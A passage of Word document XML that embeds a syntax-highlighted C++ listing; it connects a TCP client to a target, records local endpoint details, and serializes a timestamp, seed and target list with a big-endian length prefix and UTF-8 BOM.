      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>151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152         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Parent (source, this) IP that was used to connect to target (in case this machine has multiple IPs)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">153         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>TCPClient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ECEBA3" w:fill="ECEBA3"/>
        </w:rPr>
        <w:t>tcpClient</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targetIPAddress</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, port);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">154 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">155         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>if</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ECEBA3" w:fill="ECEBA3"/>
        </w:rPr>
        <w:t>tcpClient</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.getLastError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>().empty() || !</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="ECEBA3" w:fill="ECEBA3"/>
        </w:rPr>
        <w:t>tcpClient</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.connect</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156                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Strange unless target has just gone down, just fill in debug data</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">157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"Unable to properly resolve source so giving all of them:   "</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158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std::vector&lt;std::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&gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>hostAddresses</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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getHostAddresses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159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(std::vector&lt;std::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color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>const_iterator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> it = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>hostAddresses.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">(); it &lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>hostAddresses.end</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(); it++) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">160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*it;</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161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162                 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">163         } </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>else</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sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">164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ECEBA3" w:fill="ECEBA3"/>
        </w:rPr>
        <w:t>tcpClient</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.getLocalEndpointDetails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165                 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="ECEBA3" w:fill="ECEBA3"/>
        </w:rPr>
        <w:t>tcpClient</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.close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166         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">167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\r\n</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168 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">169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Utilities::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>getCurrentTimestamp</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170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\r\n</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171 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">172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Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>rootSeed</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173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\r\n</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174 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">175         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// now all the remaining targets</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">176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(std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>deque</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color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>iterator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> it = Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>targets</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(); it &lt; Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>targets</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.end</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(); it++) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">177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*it;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">178                 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>content_as_string</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\r\n</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179         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">180         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">181         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// So now we write the length of the content as a 4-byte (MSB big-endian) sequence</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">182         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// cast to (unsigned char) drops front bits for us</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">183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contentLength</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content_as_string.size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">() + 3;  </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// +3 for UTF-8 BOM</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">184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contentLength</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&gt; 24));</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">185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contentLength</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&gt; 16));</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">186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contentLength</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&gt; 8));</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">187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contentLength</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188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189 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">190         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Add the UTF-8 BOM</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">191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0xEF);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
